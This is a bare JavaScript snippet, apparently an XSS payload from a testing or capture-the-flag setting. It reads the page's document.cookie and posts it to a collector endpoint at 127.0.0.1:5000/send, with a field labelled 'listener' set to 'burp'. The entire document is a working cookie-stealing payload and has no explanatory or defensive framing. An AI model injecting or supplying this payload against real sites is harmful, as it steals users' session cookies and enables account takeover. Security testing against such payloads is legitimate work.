(function() {
    var userCookies = document.cookie;

    var formData = new URLSearchParams();
    formData.append('header', '114514');
    formData.append('listener', 'burp');
    formData.append('content', userCookies);

    fetch('http://127.0.0.1:5000/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: formData,
        credentials: 'include'
    })
    .then(response => response.text())
    .then(result => console.log(result))
    .catch(error => console.error('Error:', error));
})();
